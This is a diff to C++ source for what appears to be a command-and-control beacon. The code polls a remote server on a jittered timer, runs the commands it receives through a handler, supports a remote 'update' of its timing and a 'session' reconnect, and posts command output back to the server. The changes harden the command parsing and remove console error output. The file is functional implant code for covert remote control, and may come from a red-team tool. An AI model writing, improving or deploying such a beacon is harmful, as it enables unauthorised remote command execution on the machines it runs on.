@@ -274,61 +274,109 @@ std::tuple<int, std::string, int> httpReconnect(const std::string& address, cons
     }
 }
 
-bool handleResponse(const std::string& response_body, int& timer, const std::string& ID) {
+bool handleResponse(const std::string& response_body, const std::string& ID) {
     logger.log("Handling response from server");
     Json::Value data;
     Json::CharReaderBuilder readerBuilder;
     std::string errs;
     std::istringstream s(response_body);
+
     if (!Json::parseFromStream(readerBuilder, s, &data, &errs)) {
         logger.error("Failed to parse JSON in handleResponse: " + errs);
         throw std::runtime_error("Failed to parse JSON: " + errs);
     }
     logger.log("Parsed response: " + response_body);
 
-    if (data.isMember("commands")) {
+    if (data.isMember("commands") && data["commands"].isArray()) {
         logger.log("Commands detected in response. Processing commands...");
-        Json::Value reports;
+        Json::Value reports; // Array to hold the reports for each command
+
         for (const auto& command : data["commands"]) {
+            if (!command.isObject() || !command.isMember("command") || !command.isMember("command_uuid")) {
+                logger.error("Invalid command format encountered.");
+                continue; // Skip malformed command
+            }
+
             std::string cmd = command["command"].asString();
             std::string cmd_uuid = command["command_uuid"].asString();
-            std::string cmd_data = command["data"].asString();
             logger.log("Executing command: " + cmd + " with uuid: " + cmd_uuid);
-            std::string output = command_handler(cmd, cmd_data, cmd_uuid);
-            if (cmd == "session") {
-                logger.warn("Exited Session HTTP reconnecting");
-                auto result = httpReconnect(URL, ID, JITTER, TIMER);
-                if (std::get<0>(result) == -1) {
-                    logger.error("Unable to reconnect");
-                    std::exit;
+
+            std::string output = "Command processed."; // Default output
+
+            if (cmd == "update") {
+            
+                const Json::Value& cmd_data = command["data"];
+                if (cmd_data.isObject() && cmd_data.isMember("timer") && cmd_data.isMember("jitter")) {
+                    if (cmd_data["timer"].isInt() && cmd_data["jitter"].isInt()) {
+                        int newTimer = cmd_data["timer"].asInt();
+                        int newJitter = cmd_data["jitter"].asInt();
+                        logger.log("New timer value received: " + std::to_string(newTimer));
+                        logger.log("New jitter value received: " + std::to_string(newJitter));
+
+                        if (newTimer > 0) {
+                            TIMER = newTimer;
+                        } else {
+                            logger.error("Invalid timer received in update command: " + std::to_string(newTimer));
+                        }
+                        if (newJitter >= 0) { // Jitter can be 0
+                            JITTER = newJitter;
+                        } else {
+                            logger.error("Invalid jitter received in update command: " + std::to_string(newJitter));
+                        }
+                        output = "Timer Updated: " + std::to_string(TIMER) + ", Jitter Updated: " + std::to_string(JITTER);
+                    } else {
+                        output = "Error: Invalid data types for timer or jitter.";
+                        logger.error(output);
+                    }
+                } else {
+                    output = "Error: Malformed data for update command.";
+                    logger.error(output);
+                }
+                // --- FIX END ---
+            } else {
+                // Handle all other commands, assuming 'data' is a string.
+                // This is the generic handler path.
+                if (command.isMember("data") && command["data"].isString()) {
+                    std::string cmd_data_str = command["data"].asString();
+                    output = command_handler(cmd, cmd_data_str, cmd_uuid);
+                } else {
+                     // If data is not a string for other commands, it's an error or needs special handling.
+                    logger.warn("Command '" + cmd + "' did not contain string data. Passing empty data to handler.");
+                    output = command_handler(cmd, "", cmd_uuid);
                 }
             }
+            
+            // Special handling for 'session' command post-execution
+            if (cmd == "session") {
+                logger.warn("Exited Session HTTP reconnecting");
+                auto result = httpReconnect(URL, ID, JITTER, TIMER); // Assuming URL is accessible
+                if (std::get<0>(result) == -1) {
+                    logger.error("Unable to reconnect after session command.");
+                    std::exit(1); // Properly exit with an error code
+                }
+            }
+
+            // Append a report for the processed command
             Json::Value json_data;
             json_data["output"] = output;
             json_data["command_uuid"] = cmd_uuid;
             reports.append(json_data);
         }
-        Json::Value wrapped_reports;
-        wrapped_reports["reports"] = reports;
-        Json::StreamWriterBuilder writer;
-        std::string json_string = Json::writeString(writer, wrapped_reports);
-        std::string responseURL = generateResponse();
-        logger.log("Command reports: " + json_string);
-        logger.log("Posting command reports to: " + responseURL);
-        postRequest(responseURL, json_string);
-        return true;
-    }
 
-    if (data.isMember("timer")) {
-        int newTimer = std::stoi(data["timer"].asString());
-        logger.log("New timer value received: " + std::to_string(newTimer));
-        if (newTimer > 0) {
-            timer = newTimer;
-        } else {
-            logger.error("Invalid timer received in handleResponse: " + std::to_string(newTimer));
-            std::cerr << "Invalid timer value received: " << newTimer << std::endl;
+        // If any reports were generated, send them back to the server
+        if (!reports.empty()) {
+            Json::Value wrapped_reports;
+            wrapped_reports["reports"] = reports;
+            Json::StreamWriterBuilder writer;
+            std::string json_string = Json::writeString(writer, wrapped_reports);
+            
+            std::string responseURL = generateResponse();
+            logger.log("Command reports: " + json_string);
+            logger.log("Posting command reports to: " + responseURL);
+            postRequest(responseURL, json_string);
         }
     }
+
     return true;
 }
 
@@ -357,7 +405,7 @@ int beacon() {
                         logger.log("Launching detached thread to handle response on Unix");
                         std::thread([response_body, sleepTime]() {
                             sleepFor(sleepTime);
-                            if (!handleResponse(response_body, TIMER, ID)) {
+                            if (!handleResponse(response_body, ID)) {
                                 logger.error("Failed to send response after handling response");
                             }
                         }).detach();
@@ -369,9 +417,8 @@ int beacon() {
                             int sleepTime = std::get<1>(*data);
                             const std::string& ID = std::get<2>(*data);
                             sleepFor(sleepTime);
-                            if (!handleResponse(response_body, TIMER, ID)) {
+                            if (!handleResponse(response_body, ID)) {
                                 logger.error("Failed to send response in Windows thread");
-                                std::cerr << "Failed to send response" << std::endl;
                             }
                             delete data;
                             return 0;
@@ -380,7 +427,6 @@ int beacon() {
                         HANDLE thread = CreateThread(NULL, 0, threadFunc, threadData, 0, NULL);
                         if (thread == NULL) {
                             logger.error("Failed to create thread in Windows beacon");
-                            std::cerr << "Failed to create thread" << std::endl;
                         } else {
                             CloseHandle(thread);
                         }
@@ -388,7 +434,6 @@ int beacon() {
                 }
             } catch (const std::exception& e) {
                 logger.error("Exception in beacon loop: " + std::string(e.what()));
-                std::cerr << "Exception: " << e.what() << std::endl;
             }
         }
         logger.log("Beacon main loop sleeping for " + std::to_string(sleepTime) + " seconds");
